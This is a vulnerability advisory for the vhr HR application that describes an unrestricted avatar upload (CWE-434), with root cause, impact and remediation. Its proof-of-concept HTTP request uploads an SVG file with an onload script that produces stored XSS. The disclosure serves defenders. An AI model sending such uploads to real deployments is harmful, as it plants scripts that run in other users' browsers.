# vhr（微人事） — Unrestricted File Upload on POST /hr/userface (VHR-VULN-005)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Unrestricted Upload |
| **CWE** | CWE-434 |
| **Authentication** | Any logged-in user |

## Summary

Avatar upload accepts arbitrary extensions (e.g. SVG) without MIME/extension whitelist.

## Root cause

`FastDFSUtils.upload()` — no file type validation.

## Proof of Concept

```http
POST /hr/userface HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----BOUNDARY
Cookie: JSESSIONID=SESSION_LIBAI
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="id"

5
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
------BOUNDARY--
```

**Expected:** {"status":200,"msg":"更新成功!"}

## Impact

Stored XSS if uploaded content is served inline from FastDFS/CDN.

## Remediation

Whitelist image extensions; validate magic bytes; strip SVG scripts.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-005
- PoC: `POC_VERIFICATION_REPORT.md`
